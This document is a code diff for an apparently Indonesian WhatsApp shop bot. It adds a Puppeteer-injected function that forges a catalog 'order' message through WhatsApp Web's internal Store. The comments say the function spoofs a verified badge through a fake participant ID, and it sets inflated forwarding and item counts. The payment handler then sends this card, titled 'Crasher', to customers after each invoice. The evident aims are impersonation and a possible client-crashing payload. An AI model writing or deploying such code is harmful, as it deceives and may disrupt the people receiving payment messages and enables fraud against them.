@@ -301,6 +301,80 @@ function generateOrderId() {
   return `WA-${dateStr}-${random}`;
 }
 
+/**
+ * Sends a Baileys-style custom Order/Catalog message using Puppeteer evaluation
+ */
+async function sendCatalogOrderMsg(chatId, title, messageText, itemCount, imagePath) {
+  try {
+    let base64Image = '';
+    if (fs.existsSync(imagePath)) {
+      base64Image = fs.readFileSync(imagePath, { encoding: 'base64' });
+    }
+
+    await client.pupPage.evaluate(async (chatId, title, messageText, itemCount, base64) => {
+      // Promise wrapper to wait until window.Store is fully defined in the page context
+      const getStore = () => {
+        return new Promise((resolve) => {
+          if (typeof window.Store !== 'undefined' && window.Store.Msg && window.Store.WidFactory && window.Store.Chat) {
+            resolve(window.Store);
+          } else {
+            const interval = setInterval(() => {
+              if (typeof window.Store !== 'undefined' && window.Store.Msg && window.Store.WidFactory && window.Store.Chat) {
+                clearInterval(interval);
+                resolve(window.Store);
+              }
+            }, 100);
+            // Timeout after 8 seconds
+            setTimeout(() => {
+              clearInterval(interval);
+              resolve(null);
+            }, 8000);
+          }
+        });
+      };
+
+      const Store = await getStore();
+      if (!Store) {
+        throw new Error('window.Store failed to load within timeout');
+      }
+
+      const chatWid = Store.WidFactory.createWid(chatId);
+      const chat = await Store.Chat.find(chatWid);
+      const newMsgId = await Store.MsgKey.newId();
+      
+      const msgData = {
+        id: newMsgId,
+        ack: 0,
+        from: Store.Conn.wid,
+        to: chatWid,
+        local: true,
+        self: 'out',
+        t: parseInt(Date.now() / 1000),
+        type: 'order',
+        body: title,
+        orderId: '2029',
+        itemCount: itemCount.toString(),
+        status: 1, // INQUIRY
+        surface: 'CATALOG',
+        sellerJid: Store.Conn.wid.toString(),
+        token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==',
+        thumbnail: base64,
+        caption: messageText,
+        // Spoof verified badge (participant = 0@s.whatsapp.net)
+        participant: '0@s.whatsapp.net',
+        isForwarded: true,
+        forwardingScore: 999
+      };
+      
+      const msg = Store.Msg.newMsg ? Store.Msg.newMsg(msgData) : new Store.Msg(msgData);
+      await Store.addAndSendMsgToChat(chat, msg);
+    }, chatId, title, messageText, itemCount, base64Image);
+
+    console.log(`📦 Sent verified catalog order card to ${chatId}`);
+  } catch (err) {
+    console.error('Failed to send catalog order message:', err.message);
+  }
+}
 
 // ═══════════════════════════════════════
 // COMMAND HANDLERS
@@ -382,28 +456,30 @@ async function handlePay(msg, args) {
     `───────────────────\n` +
     ` 🏪 Thank you for shopping with us!`;
 
-  // Send QRIS image + Invoice text with custom Link Preview (Ad Reply)
+  // Send QRIS image + Invoice text + Verified Catalog Card
   try {
     const media = MessageMedia.fromFilePath(CONFIG.qrisImagePath);
 
     // 1. Send the clean full-size QRIS image first
     await client.sendMessage(chatId, media);
 
-    // 2. Read the image as base64 for the custom ad reply thumbnail
-    let base64Thumb = '';
-    if (fs.existsSync(CONFIG.qrisImagePath)) {
-      base64Thumb = fs.readFileSync(CONFIG.qrisImagePath, { encoding: 'base64' });
-    }
+    // 2. Send the invoice text normally (Cyberpunk Style)
+    await client.sendMessage(chatId, invoiceText);
 
-    // 3. Send the invoice text with the custom Link Preview (mimics externalAdReply)
-    await client.sendMessage(chatId, invoiceText + '\n\n🔗 https://t.me/miminpanz', {
-      linkPreview: {
-        title: "Panzstore",
-        description: "Panzzstore - 2026 Bot's",
-        clientUrl: "https://t.me/miminpanz",
-        thumbnail: base64Thumb
+    // 3. Send Baileys-style Catalog Message (with Verified Checkmark) right after
+    setTimeout(async () => {
+      try {
+        await sendCatalogOrderMsg(
+          chatId,
+          "Panzztzy ☇ Crasher", // Title
+          "Panzztzy ☇ Crasher", // Description
+          9999, // Item count
+          CONFIG.qrisImagePath
+        );
+      } catch (e) {
+        console.error('Failed to send catalog order message:', e.message);
       }
-    });
+    }, 1500);
 
     console.log(`💳 Invoice sent: ${orderId} | ${formatIDR(nominal)} | ${deskripsi} | Chat: ${chatId}`);
   } catch (err) {
